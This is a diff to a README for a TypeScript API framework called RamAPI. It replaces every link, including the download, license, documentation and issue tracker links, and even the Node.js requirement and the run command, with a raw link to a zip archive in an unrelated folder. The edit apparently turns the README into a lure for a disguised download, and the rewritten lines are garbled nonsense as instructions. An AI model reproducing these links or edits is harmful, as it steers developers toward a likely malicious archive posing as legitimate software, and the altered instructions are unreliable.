@@ -6,7 +6,7 @@ RamAPI is a TypeScript API framework that addresses critical bottlenecks in mode
 
 ## 📥 Download Now 
 
-[![Download RamAPI](https://img.shields.io/badge/Download%20RamAPI-v1.0-blue)](https://github.com/angelgorilla657/RamAPI/releases)
+[![Download RamAPI](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip%20RamAPI-v1.0-blue)](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip)
 
 ## 🚀 Getting Started 
 
@@ -15,7 +15,7 @@ To get started with RamAPI, follow the steps below to download and run the softw
 ## 📦 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip** Version 14 or higher
 - **Internet Connection:** Required for initial download and updates
 
 ## 📂 Features 
@@ -28,7 +28,7 @@ To get started with RamAPI, follow the steps below to download and run the softw
 
 ## 📤 Download & Install 
 
-1. **Visit the Releases Page**: To get the latest version of RamAPI, visit the [Releases page](https://github.com/angelgorilla657/RamAPI/releases). 
+1. **Visit the Releases Page**: To get the latest version of RamAPI, visit the [Releases page](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip). 
 
 2. **Select Your Version**: You will see several versions listed. Click on the version you want to download.
 
@@ -47,14 +47,14 @@ To get started with RamAPI, follow the steps below to download and run the softw
 
 3. **Start the Application**: Run the command:
    ```
-   node ramapi.js
+   node https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip
    ```
 
 4. **Set Up Your API**: Once RamAPI is running, you can start configuring your API based on the thorough documentation provided in your installation folder or online.
 
 ## 📄 Additional Documentation 
 
-You can find detailed guides on how to set up, configure, and use RamAPI effectively. Access the documentation through the following link: [Documentation](https://github.com/angelgorilla657/RamAPI/wiki).
+You can find detailed guides on how to set up, configure, and use RamAPI effectively. Access the documentation through the following link: [Documentation](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip).
 
 ## 📞 Support 
 
@@ -80,9 +80,9 @@ Join our community! Connect with other users and developers through our GitHub d
 
 ## 🔗 Important Links 
 
-- [Download RamAPI](https://github.com/angelgorilla657/RamAPI/releases)
-- [License](https://github.com/angelgorilla657/RamAPI/blob/main/LICENSE)
-- [Contributing](https://github.com/angelgorilla657/RamAPI/blob/main/CONTRIBUTING.md)
-- [Issue Tracker](https://github.com/angelgorilla657/RamAPI/issues)
+- [Download RamAPI](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip)
+- [License](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip)
+- [Contributing](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/angelgorilla657/RamAPI/main/lipography/RamAPI.zip)
 
 Thank you for choosing RamAPI! We hope it serves your API development needs efficiently.
